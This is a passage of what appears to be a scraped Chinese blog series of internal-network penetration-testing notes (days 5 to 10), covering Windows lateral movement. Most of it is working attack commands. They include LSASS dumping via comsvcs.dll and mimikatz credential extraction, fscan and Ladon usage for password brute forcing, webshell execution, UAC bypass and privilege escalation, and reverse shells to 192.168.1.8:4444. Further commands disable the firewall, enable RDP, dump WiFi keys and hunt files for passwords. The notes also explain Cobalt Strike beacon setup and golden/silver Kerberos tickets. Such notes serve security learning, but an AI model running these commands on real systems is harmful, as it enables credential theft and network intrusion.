Out-Minid 导出方式四 comsvcs.dll，系统自带。通过comsvcs.dll的导出函数MiniDump实现dump内存 命令： 1、首先查看lsass.exe进程PID: tasklist | findstr lsass.exe 2、使用powershell导出rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump476 C:\\Users\\Administrator\\Desktop\\lsass.dmp ful 针对导出的文件进行读取 命令： mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full ","link":"https://f9f.fun/post/nei-wang-xue-xi-day10/"},{"title":"内网学习day9","content":"内网学习day9 内网端口扫描 内网端口扫描概述 通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服 务的涌洞、分析目标网络的拓扑结构等， 在进行内网渗测试时，通常会使用Metasploit内置的端 口进行扫描。也可以上传端口扫描工具，使用工具进行扫描。还可以根据服务器的环境，使用自 定义的端口扫描脚本进行扫描。在获得授权的情况下，可以直接使用Nmap、masscan等端口扫 描工具获取开放的端口信息 ScanLine端口扫描 ScanLine是一款windows下的端口扫描的命令行程序。它可以完成PING扫描、TCP端口扫描、 UDP端口扫描等功能。运行速度很快，不需要winPcap库支持，应用场合受限较少。 常用方法： scanline.exe -bhpt 21-23,25,80,110,135139,143,443,445,1433,1521,3306 IP scanline.exe -bhpt 80,443 1.1.1-254(IP) scanline.exe -bhpt 139,445 IP Telnet端口扫描 Telnet协议是TCP/IP协议族的一员，是Internet远程登录服务的标准协议和主要方式。它为用 户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用Telnet协议，可以与 目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 telnet命令是最方便的 命令： telnet + IP+端口 Kscan、Fscan、工具端口扫描 kscan_windows_amd64.exe -t 192.168.131.10 -p 1-65535 shell fscan64_1.6.exe -h 192.168.131.156 -p 1-65535 ","link":"https://f9f.fun/post/nei-wang-xue-xi-day9/"},{"title":"内网学习day8","content":"内网学习day8 内网IP扫描 ICMP协议扫描 ICMP协议介绍：ICMP是(Internet Control Message Protocol)Internet控制报文协议。它是 TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、 主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于 用户数据的传递起着重要的作用 icmp扫描动静小 一、使用PING命令配合CMD语法进行C端扫描 命令： for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL= 结果： 二、使用fping是一个小型命令行工具， 用于向网络主机发送ICMP 回应请求，类似于ping，但在ping多 个主机时性能要高得多。 fping完全不同于ping，一位可以指定IP数量和网段，常用用法如下 命令： fping IP1 IP2 -c 10 扫描多个IP 10次 fping -a -g 172.18.9.0/24 扫描C 结果： ARP协议扫描 ARP协议介绍 地址解析协议，即ARP(Address Resolution Protocol)，是根据IP地 址获取物理地址的一个TCP/IP协议 一、使用本地自带ARP命令查看ARP缓存表信息 命令：Arp –a 二、使用arp的工具进行探测 命令：Apr.exe -t IP段 NETBIOS协议扫描 NetBIOS协议介绍NetBIOS协议是由IBM公司开发，主要用于数十台计算机的小型局域网。 NetBIOS协议是一种在局域网上的程序可以使用的应用程序编程接口(API)，为程序提供了请求低级服 务的统一的命令集，作用是为了给局域网提供网络以及其他特殊功能，几乎所有的局域网都是在 NetBIOS协议的基础上工作的，在网络中使用计算机名通讯就是使用NetBIOS协议， NetBIOS协议,主 要用于局域网通信,开启之后,局域网的其他计算机可以发现并找到你的计算机 netbios默认是启用的 一、可以使用工具进行扫描 命令：nbtscan.exe + IP 以上协议扫描都比较费劲麻烦 fscan扫描 FSCAN介绍：一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、 端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指 纹识别、web漏洞扫描、netbios探测、域控识别等功能 项目地址：https://github.com/shadow1ng/fscan Fsan的用法非常多。 fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描) fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥) fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell) fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行) fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口) fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名密码来进行爆破) fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) fscan.exe -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 ) fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞) fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块) fscan.exe -hf ip.txt (以文件导入) fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080) fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量 KSCAN工具扫描 kscan是一款资产测绘工具，可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在 不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴 力破解，且是go平台首款开源的RDP暴力破解工具 项目地址： https://github.com/lcvvvv/kscan 有点乱码 用自己电脑cmd演示一下 ksacn.exe -t 192.168.131.0/24 可以扫出端口 协议 指纹 所以速度会慢些 Ladon工具扫描 Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密 码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、 域名列表扫描。7.5版本内置100个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络 存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、 开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、 Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、 Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、 Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可 识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、 DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令， EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网 进行横向移动。 cs ladon插件直接查 用法 001 多协议探测存活主机 （IP、机器名、MAC地址、制造商） Ladon 192.168.1.8/24 OnlinePC 002 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务） Ladon 192.168.1.8/24 OsScan 003 扫描存活主机 Ladon 192.168.1.8/24 OnlineIP 004 ICMP扫描存活主机 Ladon 192.168.1.8/24 Ping 005 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本） Ladon 192.168.1.8/24 MS17010 006 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本） Ladon 192.168.1.8/24 SMBGhost 007 扫描Web信息/Http服务 Ladon 192.168.1.8/24 WebScan 008 扫描C段站点URL域名 Ladon 192.168.1.8/24 UrlScan 009 扫描C段站点URL域名 Ladon 192.168.1.8/24 SameWeb 010 扫描子域名、二级域名 Ladon baidu.com SubDomain 011 域名解析IP、主机名解析IP Ladon baidu.com DomainIP Ladon baidu.com HostIP 012 域内机器信息获取 Ladon AdiDnsDump 192.168.1.8 （Domain IP） 013 扫描C段端口、指定端口扫描 Ladon 192.168.1.8/24 PortScan Ladon 192.168.1.8 PortScan 80,445,3389 014 扫描C段WEB以及CMS（75种Web指纹识别） Ladon 192.168.1.8/24 WhatCMS 015 扫描思科设备 Ladon 192.168.1.8/24 CiscoScan Ladon http://192.168.1.8 CiscoScan 016 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本） Ladon EnumMssql 017 枚举网络共享资源 （域、存活IP、共享路径） Ladon EnumShare 018 扫描LDAP服务器 Ladon 192.168.1.8/24 LdapScan 019 扫描FTP服务器 Ladon 192.168.1.8/24 FtpScan 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆 密码爆破详解参考SSH：http://k8gege.org/Ladon/sshscan.html 020 445端口 SMB密码爆破(Windows) Ladon 192.168.1.8/24 SmbScan 021 135端口 Wmi密码爆破(Windowns) Ladon 192.168.1.8/24 WmiScan 022 389端口 LDAP服务器、AD域密码爆破(Windows) Ladon 192.168.1.8/24 LdapScan 023 5985端口 Winrm密码爆破(Windowns) Ladon 192.168.1.8/24 WinrmScan.ini 024 445端口 SMB NTLM HASH爆破(Windows) Ladon 192.168.1.8/24 SmbHashScan 025 135端口 Wmi NTLM HASH爆破(Windows) Ladon 192.168.1.8/24 WmiHashScan 026 22端口 SSH密码爆破(Linux) Ladon 192.168.1.8/24 SshScan Ladon 192.168.1.8:22 SshScan 027 1433端口 Mssql数据库密码爆破 Ladon 192.168.1.8/24 MssqlScan 028 1521端口 Oracle数据库密码爆破 Ladon 192.168.1.8/24 OracleScan 029 3306端口 Mysql数据库密码爆破 Ladon 192.168.1.8/24 MysqlScan 030 7001端口 Weblogic后台密码爆破 Ladon http://192.168.1.8:7001/console WeblogicScan Ladon 192.168.1.8/24 WeblogicScan 031 5900端口 VNC远程桌面密码爆破 Ladon 192.168.1.8/24 VncScan 032 21端口 Ftp服务器密码爆破 Ladon 192.168.1.8/24 FtpScan 033 8080端口 Tomcat后台登陆密码爆破 Ladon 192.168.1.8/24 TomcatScan Ladon http://192.168.1.8:8080/manage TomcatScan 034 Web端口 401基础认证密码爆破 Ladon http://192.168.1.8/login HttpBasicScan 035 445端口 Impacket SMB密码爆破(Windowns) Ladon 192.168.1.8/24 SmbScan.ini 036 445端口 IPC密码爆破(Windowns) Ladon 192.168.1.8/24 IpcScan.ini 漏洞检测/漏洞利用/Poc/Exp 037 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144) Ladon 192.168.1.8/24 MS17010 038 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894) Ladon 192.168.1.8/24 WeblogicPoc 039 PhpStudy后门检测(phpstudy 2016/phpstudy 2018) Ladon 192.168.1.8/24 PhpStudyPoc 040 ActiveMQ漏洞检测(CVE-2016-3088) Ladon 192.168.1.8/24 ActivemqPoc 041 Tomcat漏洞检测(CVE-2017-12615) Ladon 192.168.1.8/24 TomcatPoc 042 Weblogic漏洞利用(CVE-2019-2725) Ladon 192.168.1.8/24 WeblogicExp 043 Tomcat漏洞利用(CVE-2017-12615) Ladon 192.168.1.8/24 TomcatExp 044 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode) Ladon 192.168.1.8/24 Struts2Poc FTP下载、HTTP下载 045 HTTP下载 Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar 046 Ftp下载 Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe 加密解密(HEX/Base64) 047 Hex加密解密 Ladon 123456 EnHex Ladon 313233343536 DeHex 048 Base64加密解密 Ladon 123456 EnBase64 Ladon MTIzNDU2 DeBase64 网络嗅探 049 Ftp密码嗅探 Ladon FtpSniffer 192.168.1.5 050 HTTP密码嗅探 Ladon HTTPSniffer 192.168.1.5 051 网络嗅探 Ladon Sniffer 密码读取 052 读取IIS站点密码、网站路径 Ladon IISpwd DumpLsass内存密码 Ladon DumpLsass 信息收集 053 进程详细信息 Ladon EnumProcess Ladon Tasklist 054 获取命令行参数 Ladon cmdline Ladon cmdline cmd.exe 055 获取渗透基础信息 Ladon GetInfo Ladon GetInfo2 056 .NET &amp; PowerShell版本 Ladon NetVer Ladon PSver Ladon NetVersion Ladon PSversion 057 运行时版本&amp;编译环境 Ladon Ver Ladon Version 远程执行(psexec/wmiexec/atexec/sshexec) 445端口 PSEXEC远程执行命令（交互式） net user \\192.168.1.8 k8gege520 /user:k8gege Ladon psexec 192.168.1.8 psexec&gt; whoami nt authority\\system 058 135端口 WmiExec远程执行命令 （非交互式） Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami 059 445端口 AtExec远程执行命令（非交互式） Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami 060 22端口 SshExec远程执行命令（非交互式） Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami 061 JspShell远程执行命令（非交互式） Usage：Ladon JspShell type url pwd cmd Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami 062 WebShell远程执行命令（非交互式） Usage：Ladon WebShell ScriptType ShellType url pwd cmd Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami 提权降权 063 BypassUac 绕过UAC执行,支持Win7-Win10 Ladon BypassUac c:\\1.exe Ladon BypassUac c:\\1.bat 064 GetSystem 提权或降权运行程序 Ladon GetSystem cmd.exe Ladon GetSystem cmd.exe explorer 065 Runas 模拟用户执行命令 Ladon Runas user pass cmd 其它功能 066 Win2008一键启用.net 3.5 Ladon EnableDotNet 067 获取内网站点HTML源码 Ladon gethtml http://192.168.1.1 068 检测后门 Ladon CheckDoor Ladon AutoRun 069 获取本机内网IP与外网IP Ladon GetIP 070 一键迷你WEB服务器 Ladon WebSer 80 Ladon web 80 反弹Shell 071 反弹TCP NC Shell Ladon ReverseTcp 192.168.1.8 4444 nc 072 反弹TCP MSF Shell Ladon ReverseTcp 192.168.1.8 4444 shell 073 反弹TCP MSF MET Shell Ladon ReverseTcp 192.168.1.8 4444 meter 074 反弹HTTP MSF MET Shell Ladon ReverseHttp 192.168.1.8 4444 075 反弹HTTPS MSF MET Shell Ladon ReverseHttps 192.168.1.8 4444 076 反弹TCP CMD &amp; PowerShell Shell Ladon PowerCat 192.168.1.8 4444 cmd Ladon PowerCat 192.168.1.8 4444 psh 077 反弹UDP Cmd &amp; PowerShell Shell Ladon PowerCat 192.168.1.8 4444 cmd udp Ladon PowerCat 192.168.1.8 4444 psh udp 078 RDP桌面会话劫持（无需密码） Ladon RDPHijack 3 Ladon RDPHijack 3 console 079 OXID定位多网卡主机 Ladon 192.168.1.8/24 EthScan Ladon 192.168.1.8/24 OxidScan 080 查看用户最近访问文件 Ladon Recent 081 添加注册表Run启动项 Ladon RegAuto Test c:\\123.exe 082 AT计划执行程序(无需时间)(system权限) Ladon at c:\\123.exe Ladon at c:\\123.exe gui 083 SC服务加启动项&amp;执行程序(system权限） Ladon sc c:\\123.exe Ladon sc c:\\123.exe gui Ladon sc c:\\123.exe auto ServerName 084 MS16135提权至SYSTEM Ladon ms16135 whoami 085 BadPotato服务用户提权至SYSTEM Ladon BadPotato cmdline 086 SweetPotato服务用户提权至SYSTEM Ladon SweetPotato cmdline 087 whoami查看当前用户权限以及特权 Ladon whoami 088 Open3389一键开启3389 Ladon Open3389 089 RdpLog查看3389连接记录 Ladon RdpLog 090 QueryAdmin查看管理员用户 Ladon QueryAdmin 091 激活内置管理员Administrator Ladon ActiveAdmin 092 激活内置用户Guest Ladon ActiveGuest 093 查看本机命名管道 Ladon GetPipe 094 139端口Netbios协议Windows密码爆破 Ladon 192.168.1.8/24 NbtScan ","link":"https://f9f.fun/post/nei-wang-xue-xi-day8/"},{"title":"内网学习day7","content":"内网学习day7 域内信息收集 域内基本信息收集 当一台电脑加入域后就可以向域内发起查询 查询权限 whoami 我这普通用户查询不了域内信息 判断域的存在 Ipconfig /all命令 SystemInfo net config workstation Net time /domain （需要管理员权限） 以上的命令都可以查询是否存在域 查询所有域内成员计算机列表 net group &quot;domain computers&quot; /domain 查询域内所有用户组列表 net group /domain 获取域信任信息 nltest /domain_trusts 定位域控的位置 查看域控制器的机器名 nltest /DCLIST:f9f 查看域控制器的主机名 nslookup -type=SRV _ldap._tcp 查看当前时间 net time /doamin 查看域控制器组 net group &quot;Domain controllers&quot; /domain 获取域内用户 向域控制器进行查询 net user /domain 知道用户就可以进行一些密码喷洒，爆破 查询域管理用户 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net group &quot;enterprise admins&quot; /domain 举一反三可以查各个组内用户 定位域管理员 内网渗透时优先攻击域管理员登入过的电脑，这样内存中可能存在一些票据，hash 这是域内一台电脑，且域管登录 hostname f9f4 这是域内另一台，普通用户登录 这是第三台域内机，f9f2,用户登录 然后用到一个工具 psloggedom.exe工具 psloggedon.exe 可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如 果指定了用户名而不是计算 机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前 是否已登录。 用法：psloggedon.exe [-] [-l] [-x] [\\computername或username] 第一次报错 需要在后面加这个参数 因为第一次运行它会弹窗需要我们点accept 成功定位 PVEDFindADUser.exe pveFindADUser.exe 可用于查找 AD用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户， 包括本地用户、通过RDP 登录的用户、用于运行服务和计划任务的用户账 用法：pvefindaduser.exe -current 我这里用不了 正常结果应该会这样 netview.exe netview.exe 是一个枚举工具，使用 WinAPI 枚举系统 用法： -h：显示帮助菜单。 -f filename.txt：指定从中提取主机列表的文件。 -e filename.txt：指定要排除的主机名文件。 -o filename.txt：将所有输出重定向到文件。 -d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。 -g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。 -c：检查对已找到共享的访问权限 通过cs上传 没查出来 查出来一般是这样 PowerView脚本 PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、 Invoke-UserHunter 等， 用法： powershell.exe -exec bypass -command &quot;&amp; { import-module .\\PowerView.ps1;Invoke-UserHunter}&quot; 先上传 不通权限下查询到的结果是不同的 这里我用的是f9f3普通用户 敏感数据定位 内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术 数据等。 可以说，价值较高的数据基本都在内网中 重点核心业务机器 高级管理人员 系统管理人员 财务/人事/业务人员的个人计算机 产品管理系统服务器 办公系统服务器 财务应用系统服务器 核心产品源码服务器（SVN/GIT服务器） 数据库服务器 文件服务器， 共享服务器 电子邮件服务器 网站监控系统服务器 信息安全监控服务器 生产工厂服务器 站点源码备份文件， 数据库备份文件等等 游览器保存的密码和游览器的cookie 其他用户会话， 3389和ipc$连接记录， 回收站中的信息等等 Windows的无线密码 网络内部的各种账号密码， 包含电子邮箱，V**，FTP等等 1.指定目录下搜集各类敏感文件 dir /a /s /b d:&quot;*.txt&quot; * dir /a /s /b d:&quot;.xml&quot; dir /a /s /b d:&quot;*.mdb&quot; * dir /a /s /b d:&quot;.sql&quot; dir /a /s /b d:&quot;*.mdf&quot; * dir /a /s /b d:&quot;.eml&quot; dir /a /s /b d:&quot;*.pst&quot; * *dir /a /s /b d:&quot;conf&quot; * *dir /a /s /b d:&quot;bak&quot; * *dir /a /s /b d:&quot;pwd&quot; * *dir /a /s /b d:&quot;pass&quot; * *dir /a /s /b d:&quot;login&quot; * *dir /a /s /b d:&quot;user 2.指定目录下的文件中搜集各种账号密码 findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak 内网的核心敏感数据，不仅包括数据库、电子邮件，还包 括个人数据及组织的业务数据、技术数据等。可以说，价 值较高的数据基本都在内网中 ","link":"https://f9f.fun/post/nei-wang-xue-xi-day7/"},{"title":"内网学习day6","content":"内网学习day6 工作组信息收集 内网信息收集概述 内网也指局域网，是指在某个区域由多台计算机互连而成的计算机组，内网渗透就是在内网 中获取计算机的权限 外网信息收集 信息收集就是收集目标的相关信息，其中包含了 1、IP地址 2、子域名 3、目录结构 4、JS信息 5、APP和小程序 6、端口 7、旁站 8、C段 9、whois信息 10、公司结构 11、公司相关手机邮箱 12.。。。。。很多很多 内网信息收集主要是针对公司的整个网络结构，网络连通性，是否是域，用户信息等收集 进入内网的形式和操作环境 目前的网络环境是这样的 1、目标机器放在云上（这种基本没有内网，除非找到关键信息） **2、目标的机器在自己公司或者机房（这种就是内网环境） 一般我们控制内网机器的手段是两种 ** ​ **1、通过web的形式，通过漏洞，使用webshell管理工具进行连接 ** ​ 2、通过钓鱼或者近源使用CS进行连接 在进行内网渗透的时候，一般都要上线到CS去进行 CobaltStrike的基本使用 Cobalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，能让多个攻击者这 在一个团队服务器上共享目标资源和信息 CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等 等 CS还支持钓鱼攻击，可自动化挂马链接生成 CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，socks代理 ，令牌窃取等 Cobalt Strike 分为服务端和客户端 服务端 可以部署在远程服务器下或者 部署在kaili里 客户端 可以部署到本地 支持linux和windows系统 插曲： 加入进来了 我先添加了两个脚本有利于我后续操作 然后新建一个监听器 再去生成一个后门文件 我这里做实验就直接把他复制到虚拟机双击运行 就不搭靶场通过漏洞 webshell这样上传 这里也是成功上线cs 运行命令前可以 先改sleep把他改成1 不然运行命令他默认要60s才会显示 现在就可以执行命令 做内网信息收集 使用CS进行本地工作组收集信息 作用：获取本机的网络配置信息 命令：ipconfig 重点看是不是多网卡。 作用：查询操作系统和版本信息 命令： systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; systeminfo| findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; 截图： 因为不同操作系统版本有些命令和提权方式不同 所以知道操作系统版本很有必要 作用：查看系统体系结构 命令：echo %PROCESSOR_ARCHITECTURE% 截图 ： 作用：查看安装的软件及版本 命令： wmic product get name,version powershell &quot;Get-WmiObject -class win32_product | Select-Object -Property name,version&quot; 截图 我这里用的虚拟机安装的东西很少 作用：本机运行的服务 命令：wmic service list brief 截图 ： 作用：查看进程 命令： tasklist wmic process list brief 截图 可以找到我的后门文件 作用：电脑启动程序 命令：wmic startup get command,caption 截图 : 之所以要查开机自启 是为了下一步替换一些自启的程序替换成我们的后门 作用：查看计划任务（如果出现无法加载列资源 输入：chcp 437） 命令：schtasks /query /fo LIST /v 截图 : 作用：电脑开机时间 命令：net statistics workstation 截图 作用：用户列表信息 命令： net user wmic useraccount get name ,SID 截图 作用：当前会话列表 命令：net session 截图 我这里是普通用户没有权限 用自己电脑 作用：查询端口信息 命令：netstat -ano 截图 作用：查看补丁信息 命令： systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn 截图 作用：查询共享列表 命令： net share wmic share get name,path,status 截图 : 作用：查询路由信息 命令：route print 截图 作用：查询防火墙是否开启 命令：netsh firewall show state 截图 作用：关闭防火墙强 命令： Windows server 2003: netsh firewall set opmode disable Windows server 2003之后: netsh firewall set opmode disable 或者netsh advfirewall set allprofiles state off 截图 作用：防火墙其他的命令 有时候直接关闭防火墙动静太大我们需要一些其他命令允许一些程序可以运行 来做一些穿透 2003及之前的版本,允许指定的程序进行全部的连接 netsh firewall add allowedprogram c:\\f9f.exe &quot;allownc&quot; enable 2003之后的版本，允许指定的程序进行全部的连接 netsh advfirewall firewall add rule name=&quot;pass nc&quot;dir=in action=allow program=&quot;C:\\nc.exe&quot; 允许指定程序退出,命令如下 netsh advfirewall firewall add rule name=&quot;Allownc&quot; dir=out action=allow program=&quot;C: \\nc.exe&quot; 允许3389端口放行,命令如下 netsh advfirewall firewall add rule name=&quot;RemoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allo 作用：开启3389 命令： REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f #开启 REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f #关闭 这些命令都需要管理员权限 作用：收集本机的WIFI密码信息 命令： for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 截图 作用：查询RDP端口 命令： reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp&quot; /V PortNumber 截图 作用：查询当前保存的凭据 命令：cmdkey /l 截图 作用：arp信息 命令：arp -a 截图 作用：查询最近打开的文件 命令：dir %APPDATA%\\Microsoft\\Windows\\Recent 截图 : 作用：查询本地工作组 命令：net localgroup 截图 : 作用：查询管理员组员信息 命令：net localgroup administrators 截图 作用：查询RDP凭据 命令：dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials* 截图 作用：查询杀软等信息 命令： wmic /node:localhost /namespace:\\root\\securitycenter2 path antivirusproduct get displayname /format:list 截图 不一定能出来 ","link":"https://f9f.fun/post/nei-wang-xue-xi-day6/"},{"title":"内网学习day5","content":"内网学习day5 域Kerberos认证 Kerberos协议简介 这一过程有NTML认证 NTML存在中间人攻击的问题 但这有个问题，双方不能证明自己是真的自己 最大的问题：双方不能证明自己是自己，就好比对暗号，其实是不安全的 Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大 的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要 求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。 在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享 密钥）执行认证服务的 kerberos协议角色组成 在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识 别所有经此路过的亡灵，防止活着的入侵者闯入地狱 kerberos协议中也存在三个角色，分别是 1、客户端（client）：发送请求的一方 2、服务端（Server）：接收请求的一方 3、密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是： ​ AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问 TGS的TGT（票据授予票据） ​ TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务 端时所需的服务授予票据（Ticket） kerberos协议认证流程 在网络认证中存在不足：机器陷入无法证明自己是自己的困境 解决办法：建立一个买票窗口 问题：这个过程有没有问题呢？ 最大问题：卖票窗口凭什么给你卖票（你是 合法的公民吗？？？？ 解决办法：建立一个身份检验窗口 第一步：客户端拿着身份证去AS认证，认证通过后返回一张去卖票窗口买票的票（TGT 第二步：客户端拿着TGT去卖票窗口(TGS)买一张去动物园的票 第三步：客户端拿着ST去动物园 计算机是如何认证呢 客户端和AS通信原理 第一步：客户端拿着身份证去AS认证，认证通过后返回一张去卖票窗口买票的票（TGT） 提供身份信息的数据包是AS-REQ(AS-requests)。发送TGT的数据包是AS-REP(AS-response) 当用户收到TGT时候对TGT进行解密、 TGT分两部分，第一部分是我们可以解密的 解密得到第一个CT_SK ​ servername 封装后再发给TGS 客户端和TGS通信原理 第二步：客户端拿着TGT去卖票窗口(TGS)买一张去动物园的票 krbtgt是密钥分发中心的用户 我们把封装后的TGT发送给TGS TGS解密得到第二部分CT_SK ，用这个去验证第一部分信息是否正确 正确的话 server hash就是机器用户的hash 就是访问的web系统的机器用户。 知道这个hash的只有自己或者KDC ，KDC就相当于域控。 客户端和服务端通信原理 第三步：客户端拿着ST去动物园 客户端收到TGS发送的ST之后，对其进行解密 服务端收到ST之后进行解密 1、使用本机的机器用户HASH值解密ST得到 CS_SK 2、拿着CS_SK解密第一部分得到相关信息 3、进行对比后成功访问建立信任 伪造TGT直接跳过AS验证到TGS 称为 黄金票据 伪造ST跳过KDC认证直接访问web系统 称为 白银票据 TGT如下图 要想伪造TGT 最主要的是krbtgt的HASH加密 而CS_SK和CT_SK是可以轻易伪造的 因为再认证流程中这个不重要不影响认证往前 伪造ST 最重要的是server hash 就是我们想要访问电脑的hash密码 对比两个票据看起来白银票据伪造 ST 更方便 但实际上如果要想伪造ST我们就要知道域内每一台我们想访问的电脑的hash（或者说web系统中有多个服务，不同服务需要的ST不同） 而伪造TGT后TGS会给我们对应ST就不需要去知道域内每一台的hash 只需要知道 TGS 的hash 所以黄金票据的作用是要大于白银票据的 AS-REQ和AS-REP数据包分析 第一步：客户端拿着身份证去AS认证，认证通过后返回一张去卖票窗口买票的票（TGT） 提供身份信息的数据包是AS-REQ(AS-requests) 发送TGT的数据包是AS-REP(AS-response) 我们使用kekeo进行申请TGT，并且使用wireshark进行抓包分析， 我的实验机还是两台win 2016 一台f9f3 一台f9f4 Kekeo工具是用来进行kerberos攻击的工具 Tgt::ask /user:域用户 /domain:域名 /password:密码 AS-REP(AS-Response):当KDC收到AS-REQ之后解密PA-DATA pA-ENC-TIMESTAMP 如果成功就返回AS- REP 1、enc-part：TGT中由KRBTGT哈希值加密部分 2、enc-part：TGT中由用户哈希值加密部分 我这里第一次复现失败了 as-rep没有后来我换成administrator用户就成功了 TGS-REQ和TGS-REP数据包分析 tgs::ask /tgt:tgt票据 /service:服务名/域名地址 服务名 有很多 我这里申请cifs 共享目录的票据 TGS-REQ：客户端发送给TGS数据包，其中包含大体如下： 1、authenticator：使用CT_SK加密内容 